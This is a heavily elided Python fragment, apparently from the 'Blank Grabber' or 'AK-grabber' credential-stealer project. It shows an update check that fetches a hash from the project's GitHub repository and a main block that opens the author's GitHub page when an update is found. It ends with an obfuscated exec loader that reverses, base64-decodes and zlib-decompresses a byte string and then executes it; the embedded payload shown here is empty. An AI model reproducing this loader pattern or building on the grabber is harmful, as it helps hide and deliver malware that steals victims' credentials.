		...
		if Settings.UpdatesCheck:
			...
			if os.path.isfile(hashFilePath):
				...
				try:
					...
					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/0x559/AK-grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]
...
if __name__ == "__main__":
	...
	if os.name == "nt":
		...
		if Utility.CheckForUpdates():
			...
			if response:
				webbrowser.open_new_tab("https://github.com/0x559")
				exit(0)
	
		# Do not hide console so it can show if there is any error
		# Utility.ToggleConsole(False)
		_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))
